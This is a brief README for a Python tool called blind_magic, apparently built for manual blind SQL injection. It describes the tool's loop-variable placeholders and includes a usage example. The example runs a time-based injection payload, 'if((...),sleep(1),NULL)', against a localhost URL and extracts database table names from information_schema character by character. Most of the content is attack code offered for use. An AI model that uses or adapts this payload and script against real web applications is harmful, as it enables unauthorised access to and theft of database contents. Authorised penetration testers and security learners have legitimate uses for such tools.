# blind_magic 0.1.2  
Manual Blind SQL Injection  
  
Some trick:  
I supply to you 5 loop variables l1 to l5 {l1} {l2} {l3} {l4} {l5}  
  
Blind query statament:  
{CONDITION_QUERY}  
{QUERY}  
{OPERATOR}  
{CHAR}  
  
example:  
  
blind_magic = Blind_magic()  
blind_magic.l(13,5,0,0,0,1,0,0,0,0)  
blind_magic.url = "http://localhost/?id="  
blind_magic.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"  
blind_magic.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"  
blind_magic.query = "select table_name from information_schema.tables limit {l2},1"  
blind_magic.run()  
print blind_magic.result  
